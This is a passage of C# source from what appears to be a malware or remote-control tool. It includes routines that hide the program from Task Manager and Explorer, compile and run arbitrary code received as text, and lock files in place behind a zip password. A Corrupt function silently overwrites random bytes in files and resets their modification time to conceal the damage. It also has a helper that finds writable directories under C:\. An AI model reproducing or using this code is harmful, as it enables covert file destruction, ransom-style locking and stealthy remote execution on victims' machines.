                string Description = FileVersionInfo.GetVersionInfo(file).FileDescription;
                string ReturnVal = string.IsNullOrEmpty(Description) ? "Error" : Description;
                return ReturnVal;
            }
            catch { return "Error"; }
        }
        public static string GetArgument(string text, int number)
        {
            try
            {
                return text.Split('"').Skip((2 * number) - 1).First();
            }
            catch (Exception)
            {
                return "";
            }

        }
        public static string RunCmd(string text, int number)
        {
            try
            {
                return text.Split(new string[] { "*~i!@", "@!i~*" }, StringSplitOptions.None).Skip((2 * number) - 1).First();
            }
            catch (Exception) { return ""; }

        }

        public static string ReverseString(string String)
        {
            char[] CArray = String.ToCharArray();
            Array.Reverse(CArray);
            return new string(CArray);
        }
        private static int CountArguments(string input)
        {
            return input.Count(c => c == '"') / 2;
        }

        public static string GetIP()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
            {
                socket.Connect("8.8.4.4", 5000);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }

        private static void RunCode(string Source, string[] ReferencedAssemblies, string Namespace, string Class, string Method)
        {
            object o = new CSharpCodeProvider().CompileAssemblyFromSource(new CompilerParameters(ReferencedAssemblies), Source).CompiledAssembly.CreateInstance(Namespace + "." + Class);
            o.GetType().GetMethod(Method).Invoke(o, null);
        }

        private static string GetCD()
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.CDRom)
                {
                    return drive.RootDirectory.FullName[0].ToString();
                }
            }
            return "";
        }


        #region encrypt/decrypt
        public static void Encrypt(string file, string password)
        {

            try
            {
                ZipFile zip = new ZipFile();
                zip.AddFile(file);
                zip.Password = password;
                zip.Save(file);
            }
            catch (Exception) { }
        }

        public static void Decrypt(string file, string password)
        {

            try
            {
                MemoryStream zipextracted = new MemoryStream();
                ZipFile zip = ZipFile.Read(file);
                zip.Password = password;
                zip.FirstOrDefault().Extract(zipextracted);

                File.WriteAllBytes(file, zipextracted.ToArray());
            }
            catch (Exception) { }
        }

        #endregion
        #region Hide from Task Manager
        public static List<string> GetProcessList()
        {
            List<string> list = new List<string>();
            AutomationElement el = AutomationElement.FromHandle(TskMgrListView32);

            TreeWalker walker = TreeWalker.ContentViewWalker;
            for (AutomationElement child = walker.GetFirstChild(el);
                child != null;
                child = walker.GetNextSibling(child))
            {
                list.Add(child.Current.Name);
            }
            return list;
        }

        public static void DeleteProcess(int index)
        {
            SendMessage(TskMgrListView32, 0x1008, index, 0);
        }
        #endregion
        #region Hide from Explorer
        private static List<IntPtr> GetCabinetHandles()
        {
            int Count = 0;
            List<IntPtr> Handles = new List<IntPtr>();
            IntPtr Window = FindWindowEx(DesktopWindow, IntPtr.Zero, "CabinetWClass", null);

            for (int I = 0; I != 10; I++)
            {
                if (!Handles.Any(x => x == Window))
                {
                    Handles.Add(Window);

                    Count++;
                }
                else
                {
                    break;
                }
                Window = FindWindowEx(DesktopWindow, Window, "CabinetWClass", null);
            }

            return Handles;
        }
        private static bool IsViewingMe()
        {

            CabinetHandles = GetCabinetHandles();
            foreach (IntPtr CabinetHandle in CabinetHandles)
            {
                string Title = GetTitle(CabinetHandle);
                if (Title == new FileInfo(Assembly.GetExecutingAssembly().Location).Directory.Name
                    || Title == Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location))
                {
                    return true;
                }
                return false;
            }
            return false;

        }
        private static string GetTitle(IntPtr Window)
        {
            int length = GetWindowTextLength(Window);
            StringBuilder builder = new StringBuilder(length);
            GetWindowText(Window, builder, length + 1);
            return builder.ToString();
        }
        #endregion

        public static string RandomWriteDirectory(Random RNG)
        {
            List<string> Directories = new List<string>();
            try
            {
                foreach (string s in Directory.GetDirectories("C:\\", "*", SearchOption.TopDirectoryOnly))
                {
                    if (CanWrite(s))
                    {
                        Directories.Add(s);
                        try
                        {
                            foreach (string SS in Directory.GetDirectories(s, "*", SearchOption.TopDirectoryOnly))
                            {
                                if (CanWrite(SS))
                                {
                                    Directories.Add(SS);
                                    try
                                    {
                                        foreach (string SSS in Directory.GetDirectories(SS, "*", SearchOption.TopDirectoryOnly))
                                        {
                                            if (CanWrite(SSS))
                                            {
                                                Directories.Add(SSS);
                                            }
                                        }
                                    }
                                    catch
                                    { }
                                }

                            }
                        }
                        catch
                        { }
                    }

                }

            }
            catch { }
            return Directories[RNG.Next(0, Directories.Count)];
        }
        public static void Corrupt(Random RNG, string file)
        {
            try
            {
                DateTime LastModified = File.GetLastWriteTime(file);

                using (Stream stream = File.Open(file, FileMode.Open))
                {
                    int ReplaceCount = RNG.Next(1, Convert.ToInt32(Math.Min(stream.Length - 1, int.MaxValue - 1)));
                    byte[] RandomBytes = new byte[ReplaceCount];
                    RNG.NextBytes(RandomBytes);

                    stream.Position = RNG.Next(0, (int)stream.Length - ReplaceCount);
                    stream.Write(RandomBytes, 0, ReplaceCount);
                }
                File.SetLastWriteTime(file, LastModified);
            }
            catch
            {
            }
        }
        public static bool CanWrite(string path)
        {
            try
            {
                FileStream TestFS = File.Create(path + "\\" + Path.GetRandomFileName(), 1, FileOptions.DeleteOnClose);
                TestFS.Dispose();
                return true;
            }
            catch
            {
                return false;
            }

        }
    }

}
